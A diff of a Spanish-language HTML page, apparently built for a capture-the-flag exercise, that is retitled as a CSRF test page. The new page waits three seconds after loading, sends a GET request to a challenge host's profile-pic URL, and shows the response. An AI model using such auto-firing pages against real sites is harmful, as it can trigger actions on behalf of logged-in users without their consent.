@@ -2,60 +2,60 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <title>Página de Rastreo Simple con Respuesta</title>
+    <title>Página de Pruebas CSRF con Retraso</title>
     <style>
-        /* Estilos básicos para que el contenido de la respuesta sea legible */
         #respuesta-servidor {
             margin-top: 20px;
             padding: 10px;
             border: 1px solid #ccc;
-            white-space: pre-wrap; /* Mantiene los saltos de línea y espacios */
+            white-space: pre-wrap; 
             background-color: #f7f7f7;
+            font-family: monospace;
         }
     </style>
 </head>
 <body>
 
-    <h1>Página de Pruebas</h1>
-    <p>Esta página está diseñada para hacer una petición GET al cargar.</p>
+    <h1>Página de Pruebas CSRF</h1>
+    <p>Esta página hará un GET a la URL objetivo **después de un retraso de 3 segundos**.</p>
     
-    <p id="estado-peticion">Estado: Enviando petición...</p>
+    <p id="estado-peticion">Estado: **Esperando 3 segundos para asegurar la sesión...**</p>
     
-    <h2>Respuesta del Servidor:</h2>
+    <h2>Respuesta del Servidor (Contenido HTML obtenido):</h2>
     <div id="respuesta-servidor">Esperando respuesta...</div>
 
     <script>
-        // La URL a la que deseas enviar la petición GET
-        const URL_OBJETIVO = 'https://chl-a85cf6b8-7049-4023-abe6-fee13a1a5d5a-imagen-importante.softwareseguro.com.ar';
-        
-        // Elementos para mostrar el estado y la respuesta
+        const URL_OBJETIVO = 'https://chl-a85cf6b8-7049-4023-abe6-fee13a1a5d5a-imagen-importante.softwareseguro.com.ar/profile-pic';
+        const DELAY_MS = 3000; // Retraso en milisegundos (3 segundos)
+
         const estadoElemento = document.getElementById('estado-peticion');
         const respuestaElemento = document.getElementById('respuesta-servidor');
 
-        // Función que se ejecuta al cargar la página
-        window.onload = function() {
+        // La función principal que ejecuta el GET
+        function ejecutarGet() {
+            estadoElemento.textContent = `Estado: Enviando petición...`; // Actualiza el estado
+            
             fetch(URL_OBJETIVO)
                 .then(response => {
-                    // La petición fue exitosa (código 200-299)
-                    estadoElemento.textContent = `Estado: Petición enviada con éxito (Status: ${response.status}).`;
-                    console.log('Petición GET exitosa:', response);
-                    
-                    // IMPORTANTE: Leer el cuerpo de la respuesta como texto.
+                    estadoElemento.textContent = `Estado: Petición enviada (Status: ${response.status}).`;
                     return response.text(); 
                 })
                 .then(data => {
-                    // Mostrar el cuerpo de la respuesta (el contenido) en el div
                     respuestaElemento.textContent = data;
                 })
                 .catch(error => {
-                    // La petición falló por un error de red o CORS
-                    estadoElemento.textContent = `Estado: Error al enviar la petición. Revisa la consola (F12) para detalles.`;
+                    estadoElemento.textContent = `Estado: Error de red. Revisa la consola (F12) para errores de CORS.`;
                     respuestaElemento.textContent = `Error: ${error.message}`;
                     console.error('Error en la petición GET:', error);
                 });
+        }
+
+        // Función que se ejecuta al cargar la página
+        window.onload = function() {
+            // Utilizamos setTimeout para ejecutar ejecutarGet() después de DELAY_MS
+            setTimeout(ejecutarGet, DELAY_MS);
         };
     </script>
 
 </body>
 </html>
-
